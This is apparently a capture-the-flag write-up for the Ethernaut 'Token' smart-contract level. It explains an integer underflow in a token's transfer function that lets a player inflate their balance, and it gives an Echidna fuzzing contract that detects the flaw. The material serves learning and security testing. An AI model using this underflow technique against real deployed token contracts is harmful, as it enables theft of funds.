# Token Ethernaut

## Goals

=> You are given 20 tokens to start with and you will beat the level if you somehow manage to get your hands on any additional tokens. Preferably a very large amount of tokens.

### Hints

- What is an odometer?

### Solution

- The vulnerability here is a simple underflow and no check if the sender even has the balance he is sending so he could just send 21 or more tokens to someone else and the require would be true since the undeflow will generate a number in the "2 \*\* 256 - 1" range .
- I solved it with echidna fuzzing this time.

### Fuzzing Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Token.sol";

contract TokenEchidna {
    Token token;

    constructor() public {
        token = new Token(20);
    }

    function echidna_testOverflow() public view returns (bool) {
        return token.balanceOf(address(this)) < 20;
    }

    function testOverflow(address _to, uint _value) public {
        require(_value > 0);
        token.transfer(_to, _value);
        assert(token.balanceOf(address(this)) < 20);
    }
}
```
